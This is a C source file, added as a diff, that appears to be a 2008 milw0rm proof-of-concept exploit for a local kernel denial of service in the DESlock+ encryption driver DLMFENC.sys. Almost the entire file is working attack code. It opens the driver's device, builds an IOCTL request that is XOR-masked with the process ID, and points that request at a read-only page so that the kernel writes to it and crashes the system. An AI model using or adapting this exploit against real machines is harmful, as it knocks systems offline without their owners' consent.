@@ -1,0 +1,101 @@
+/* deslock-probe-read.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * DESlock+ <= 3.2.7 local kernel DoS POC
+ * by mu-b - Sat 19 Jul 2008
+ *
+ * - Tested on: DLMFENC.sys 1.0.0.28
+ *
+ * call to ProbeForRead with a user-definable address that
+ * is eventually overwritten (should have been ProbeForWrite).
+ *
+ * http://www.cctmark.gov.uk/CCTMAwards/DataEncryptionSystemsLtd/tabid/103/Default.aspx
+ * - I wonder what that says about CESG CCTM?
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <windows.h>
+
+#define DLMFENC_IOCTL 0x0FA4204C
+#define DLMFENC_FLAG  0xC001D00D
+
+#define ARG_SIZE(a)   ((a-(sizeof (int)*2))/sizeof (void *))
+
+struct ioctl_req {
+  int flag;
+  int req_num;
+  void *arg[ARG_SIZE(0x20)];
+};
+
+static void
+xor_mask_req (struct ioctl_req *req)
+{
+  DWORD i, pid;
+  PCHAR ptr;
+
+  pid = GetCurrentProcessId ();
+  for (i = 0, ptr = (PCHAR) req; i < 0x0C; i++, ptr++)
+    *ptr ^= pid;
+}
+
+int
+main (int argc, char **argv)
+{
+  struct ioctl_req req;
+  HANDLE hFile, hThread;
+  DWORD rlen, dThread, nTotal, nFail;
+  LPVOID zpage;
+  BOOL result;
+
+  printf ("DESlock+ <= 3.2.7 local kernel DoS PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  fflush (stdout);
+  hFile = CreateFileA ("\\\\.\\DLKPFSD_Device", FILE_EXECUTE,
+                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
+                       OPEN_EXISTING, 0, NULL);
+  if (hFile == INVALID_HANDLE_VALUE)
+    {
+      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
+      exit (EXIT_FAILURE);
+    }
+
+  zpage = VirtualAlloc (NULL, 0x1000,
+                        MEM_RESERVE|MEM_COMMIT, PAGE_READONLY);
+  if (zpage == NULL)
+    {
+      fprintf (stderr, "* VirtualAlloc failed\n");
+      exit (EXIT_FAILURE);
+    }
+  printf ("* allocated page: 0x%08X [%d-bytes]\n",
+          zpage, 0x1000);
+
+  req.flag = DLMFENC_FLAG;
+  req.req_num = 18;
+  req.arg[0] = (void *) zpage;
+  sleep (2000);
+
+  xor_mask_req (&req);
+  result = DeviceIoControl (hFile, DLMFENC_IOCTL,
+                            &req, sizeof req, &req, sizeof req, &rlen, 0);
+  if (!result)
+    {
+      fprintf (stderr, "* DeviceIoControl failed\n");
+      exit (EXIT_FAILURE);
+    }
+
+  printf ("* hmmm, you didn't STOP the box?!?!\n");
+
+  CloseHandle (hFile);
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2008-09-20]
